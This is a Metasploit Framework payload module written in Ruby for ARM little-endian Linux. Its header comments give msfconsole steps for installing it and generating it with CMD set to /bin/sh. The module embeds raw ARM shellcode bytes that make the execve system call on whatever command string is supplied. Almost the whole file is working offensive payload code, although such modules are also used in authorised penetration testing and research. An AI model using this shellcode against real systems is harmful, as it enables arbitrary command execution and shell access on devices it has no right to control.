
# Title: Linux Execute Command on ARM Architecture (MSF)
# Tested on: ARM926EJ-S rev 5 (v5l)
# Author: Jonathan Salwan - @jonathansalwan
# http://shell-storm.org


# $ mkdir -p modules/payloads/singles/linux/armle
# $ cp ./exec.rb modules/payloads/singles/linux/armle/exec.rb
# $ ./msfconsole

# msf> use linux/armle/exec
# msf payload(exec)> set CMD /bin/sh
# CMD => /bin/sh
# msf payload(exec)> generate


##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

###
#
# Exec
# ----
#
# Executes an arbitrary command.
#
###
module Metasploit3

        include Msf::Payload::Single
        include Msf::Payload::Linux

        def initialize(info = {})
                super(merge_info(info,
                        'Name'          => 'Linux Execute Command',
                        'Version'       => '1.1',
                        'Description'   => 'Execute an arbitrary command',
                        'Author'        => 'Jonathan Salwan',
                        'License'       => MSF_LICENSE,
                        'Platform'      => 'linux',
                        'Arch'          => ARCH_ARMLE))

                register_options(
                        [
                                OptString.new('CMD',  [ true,  "The command string to execute" ]),
                        ], self.class)
        end

        def generate_stage
                cmd     = datastore['CMD'] || ''

                payload =
                        "\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x0c\x30" +
                        "\xc0\x46\x01\x90\x49\x1a\x92\x1a\x0b\x27\x01\xdf" + cmd

        end

end




